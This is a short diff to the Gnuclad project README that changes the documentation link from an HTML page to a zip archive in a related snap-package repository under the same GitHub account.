@@ -6,7 +6,7 @@ Example outputs created with Gnuclad:
 
 Gnuclad is licensed under GNU GPL v3
 
-[A copy of the documentation can be found here.](https://eylenburg.github.io/gnuclad/documentation/Index.html)
+[A copy of the documentation can be found here.](https://github.com/eylenburg/gnuclad-snap/raw/main/documentation.zip)
 
 
 ## Snap package
